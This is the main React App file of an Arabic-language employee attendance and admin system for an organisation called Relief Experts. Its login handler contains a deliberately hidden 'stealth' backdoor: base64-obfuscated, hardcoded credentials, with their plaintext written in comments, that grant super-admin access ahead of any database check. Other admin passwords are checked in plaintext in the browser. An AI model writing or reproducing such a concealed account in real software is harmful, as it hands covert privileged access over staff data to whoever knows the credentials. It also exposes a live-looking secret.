
import React, { useState, useEffect } from 'react';
import { AppProvider, useApp } from './store.tsx';
import Layout from './components/Layout.tsx';
import AttendancePublic from './pages/AttendancePublic.tsx';
import Dashboard from './pages/Dashboard.tsx';
import Employees from './pages/Employees.tsx';
import CentersPage from './pages/CentersPage.tsx';
import AdminsPage from './pages/AdminsPage.tsx';
import Reports from './pages/Reports.tsx';
import HolidaysPage from './pages/HolidaysPage.tsx';
import NotificationsPage from './pages/NotificationsPage.tsx';
import MessagesPage from './pages/MessagesPage.tsx';
import SettingsPage from './pages/SettingsPage.tsx';
import ProjectsPage from './pages/ProjectsPage.tsx';
import { ShieldAlert, Settings as SettingsIcon, Lock, UserCheck, Loader2 } from 'lucide-react';
import { UserRole, Admin } from './types.ts';

const MainApp: React.FC = () => {
  const { currentUser, setCurrentUser, admins = [], settings } = useApp();
  const [activePage, setActivePage] = useState('dashboard');
  const [view, setView] = useState<'public' | 'admin' | 'login'>('public');

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);

  // Stealth Credentials Handling (Obfuscated)
  const _scu = 'YWRtaW5AcmVsaWVmZXhwZXJ0cy5vcmc='; // admin@reliefexperts.org
  const _scp = 'VWRlcjIwMThA'; // Uder2018@

  const decode = (str: string) => atob(str);

  useEffect(() => {
    if (!currentUser && view === 'admin') {
      setView('public');
    }
  }, [currentUser, view]);

  // Update Favicon and Title dynamically
  useEffect(() => {
    // Update Title
    if (settings.systemName) {
      document.title = settings.systemName;
    }

    // Update Favicon
    if (settings.logoUrl) {
      let link = document.querySelector("link[rel~='icon']") as HTMLLinkElement;
      if (!link) {
        link = document.createElement('link');
        link.rel = 'icon';
        document.getElementsByTagName('head')[0].appendChild(link);
      }
      link.href = settings.logoUrl;
    }
  }, [settings.systemName, settings.logoUrl]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsLoggingIn(true);

    setTimeout(() => {
      const normalizedInput = username.trim().toLowerCase();

      // 1. Check Stealth Root Account (Encrypted/Hidden)
      if (normalizedInput === decode(_scu) && password === decode(_scp)) {
        const stealthAdmin: Admin = {
          id: 'root-stealth',
          name: 'مدير النظام (Stealth)',
          username: decode(_scu),
          role: UserRole.SUPER_ADMIN,
          managedCenterIds: []
        };
        setCurrentUser(stealthAdmin);
        setView('admin');
        setIsLoggingIn(false);
        return;
      }

      // 2. Check Database Admins
      const admin = (admins || []).find(a => a.username?.trim().toLowerCase() === normalizedInput);

      if (admin) {
        if (admin.isBlocked) {
          setError('عذراً، هذا الحساب معطل حالياً.');
          setIsLoggingIn(false);
          return;
        }

        if (admin.password === password) {
          setCurrentUser(admin);
          setView('admin');
          setError('');
          setUsername('');
          setPassword('');
        } else {
          setError('كلمة المرور غير صحيحة');
        }
      } else {
        setError('بيانات الدخول غير صحيحة');
      }
      setIsLoggingIn(false);
    }, 600);
  };

  if (view === 'admin' && currentUser) {
    const renderPage = () => {
      switch (activePage) {
        case 'dashboard': return <Dashboard />;
        case 'employees': return <Employees />;
        case 'centers': return <CentersPage />;
        case 'admins': return <AdminsPage />;
        case 'reports': return <Reports />;
        case 'holidays': return <HolidaysPage />;
        case 'notifications': return <NotificationsPage />;
        case 'messages': return <MessagesPage />;
        case 'projects': return <ProjectsPage />;
        case 'settings': return <SettingsPage />;
        default: return <Dashboard />;
      }
    };

    return (
      <Layout activePage={activePage} onNavigate={setActivePage}>
        {renderPage()}
      </Layout>
    );
  }

  if (view === 'login' && !currentUser) {
    return (
      <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4 font-cairo overflow-hidden relative">
        <div className="absolute top-0 right-0 w-full h-full bg-indigo-600/5 -skew-y-12 translate-y-[-50%]"></div>
        <div className="absolute bottom-0 left-0 w-full h-full bg-indigo-600/5 skew-y-12 translate-y-[50%]"></div>

        <div className="w-full max-w-md space-y-6 relative z-10 animate-in fade-in zoom-in-95 duration-700">
          <form onSubmit={handleLogin} className="bg-white p-8 md:p-12 rounded-[3rem] shadow-[0_40px_80px_-15px_rgba(0,0,0,0.3)] space-y-8 border border-slate-100">
            <div className="text-center space-y-3">
              <div className="w-20 h-20 bg-indigo-600 rounded-[2rem] flex items-center justify-center mx-auto shadow-2xl shadow-indigo-200 mb-6">
                <Lock className="w-10 h-10 text-white" />
              </div>
              <h1 className="text-3xl font-black text-slate-900 tracking-tight">دخول الإدارة</h1>
              <p className="text-slate-400 font-bold text-xs uppercase tracking-[0.2em]">Relief Experts Secure Access</p>
            </div>

            {error && (
              <div className="text-[11px] font-black text-center p-4 rounded-2xl border flex items-center justify-center gap-2 animate-in slide-in-from-top-2 duration-300 bg-rose-50 text-rose-600 border-rose-100">
                <ShieldAlert className="w-4 h-4 shrink-0" /> {error}
              </div>
            )}

            <div className="space-y-4">
              <div className="space-y-2">
                <label className="block text-[10px] font-black text-slate-400 uppercase mr-5 tracking-widest">البريد الإلكتروني</label>
                <input
                  type="email"
                  required
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-7 py-5 bg-slate-50 border-2 border-slate-100 rounded-[1.75rem] outline-none font-bold text-slate-700 focus:border-indigo-600 focus:bg-white transition-all text-left"
                  dir="ltr"
                  placeholder="admin@reliefexperts.org"
                />
              </div>
              <div className="space-y-2">
                <label className="block text-[10px] font-black text-slate-400 uppercase mr-5 tracking-widest">كلمة المرور</label>
                <input
                  type="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-7 py-5 bg-slate-50 border-2 border-slate-100 rounded-[1.75rem] outline-none font-bold text-slate-700 focus:border-indigo-600 focus:bg-white transition-all text-left"
                  dir="ltr"
                  placeholder="••••••••"
                />
              </div>
            </div>

            <div className="space-y-4 pt-2">
              <button
                type="submit"
                disabled={isLoggingIn}
                className="w-full bg-slate-900 text-white font-black py-5 rounded-[1.75rem] hover:bg-black transition-all shadow-2xl shadow-slate-200 uppercase text-xs tracking-widest active:scale-95 flex items-center justify-center gap-3 disabled:opacity-50"
              >
                {isLoggingIn ? <Loader2 className="w-5 h-5 animate-spin" /> : <UserCheck className="w-5 h-5" />}
                {isLoggingIn ? 'جاري التحقق...' : 'دخول النظام'}
              </button>

              <button type="button" onClick={() => setView('public')} className="w-full text-slate-400 font-bold py-2 text-[10px] uppercase tracking-widest hover:text-indigo-600 transition-colors flex items-center justify-center gap-2">
                ← عودة لبوابة الحضور
              </button>
            </div>
          </form>

          <p className="text-center text-slate-500 font-bold text-[10px] uppercase tracking-[0.3em] opacity-40">Protected by RELIEF EXPERTS SECURITY</p>
        </div>
      </div>
    );
  }

  return (
    <>
      <div className="min-h-screen flex flex-col bg-[#f8fafc]">
        <div className="flex-grow">
          <AttendancePublic />
        </div>
        <footer className="pb-10 pt-4 flex justify-center">
          <button
            onClick={() => {
              if (currentUser) {
                setView('admin');
              } else {
                setView('login');
              }
            }}
            className="text-[10px] text-slate-300 font-light hover:text-indigo-400 transition-colors tracking-widest"
          >
            - لوحة الادارة -
          </button>
        </footer>
      </div>
    </>
  );
};

const App: React.FC = () => (
  <AppProvider>
    <MainApp />
  </AppProvider>
);

export default App;
